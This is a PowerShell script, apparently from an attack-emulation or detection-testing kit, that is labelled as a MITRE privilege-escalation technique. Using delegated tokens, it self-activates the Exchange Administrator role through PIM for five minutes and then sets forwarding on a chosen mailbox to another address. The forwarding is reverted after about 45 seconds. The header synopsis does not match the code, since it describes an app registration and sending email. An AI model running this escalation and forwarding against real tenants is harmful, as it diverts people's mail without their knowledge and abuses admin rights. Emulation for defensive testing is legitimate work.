<#
.SYNOPSIS
Connect to Graph API, create an app registration, assign it elevated permissions and use these to send an email on behalf of another user

.DESCRIPTION
TA0004: Privilege Escalation
T1548.005:  Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access 
2nd attack method
#>

Get-Module | Where-Object name -eq connect-exo | Remove-Module -Verbose
Import-Module ../APIs/connect-EXO.psm1
Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1
Get-Module | Where-Object name -eq randomPassword | Remove-Module
Import-Module ../Helpers/randomPassword.psm1


# We use the ews environment variables
Import-Environment "exops.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scopeGraph = "RoleEligibilitySchedule.Read.Directory RoleAssignmentSchedule.ReadWrite.Directory"
$scopePS = "https://outlook.office.com/Exchange.Manage"
$scope = "$scopePS $scopeGraph"
if ($null -eq $refreshToken) { $refreshToken = Get-DelegatedAccessToken -refreshToken -tenantId $env:TENANT_ID -clientId $env:EXOPS_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:EXOPS_DELEGATE_REDIRECT_URI }
$accessToken = Get-AccessTokenFromRefreshToken -refreshToken $refreshToken -tenantId $env:TENANT_ID -clientId $env:EXOPS_DELEGATE_CLIENT_ID -scope $scopeGraph

# Check what role assignments are available
$url = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleEligibilitySchedules/filterByCurrentUser(on='principal')"
$response = Invoke-RestMethod $url -Method Get -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"}

# Exchange Administrator
$role = "29232cdf-9323-42fd-ade2-1d097af3e4de"
if ($response.value.roleDefinitionId -notcontains $role) {
    Write-Warning "Exchange Administrator role is not available"
    exit 1
}
$principal = $response.value[0].principalId;
Write-Host $role

$url = "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignmentScheduleRequests"
$rand = Get-Random -Minimum 1000 -Maximum 9999
$enableRequest = @{
    "action" = "selfActivate";
    "roleDefinitionId" = $role;
    "directoryScopeId" = "/";
    "principalId" = $principal;
    "scheduleInfo" = @{
        "startDateTime" = $(Get-Date -Format "yyyy-MM-dd\THH:mm:ss\+02:00");
        "expiration" = @{
            "type" = "afterDuration";
            "duration" = "PT5M"; #5 minutes
        };
    };
    "justification" = "TA0004 - T1548.005 - A2 - $rand";
}
$enableRequest = ConvertTo-Json -Depth 99 $enableRequest
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $enableRequest

$accessTokenPS = Get-AccessTokenFromRefreshToken -refreshToken $refreshToken -tenantId $env:TENANT_ID -clientId $env:EXOPS_DELEGATE_CLIENT_ID -scope $scopePS
Connect-ExchangeOnline -accessToken $accessTokenPS -Organization $env:TENANT_ID

$upn = Read-Host "Source mailbox (UPN)"
$upn2 = Read-Host "Forward to (UPN)"
set-mailbox -Identity $upn -ForwardingSmtpAddress $upn2  -DeliverToMailboxAndForward $True

Wait-KeyOrTimeOut -Timeout 45000
set-mailbox -Identity $upn -ForwardingSmtpAddress $null  -DeliverToMailboxAndForward $False

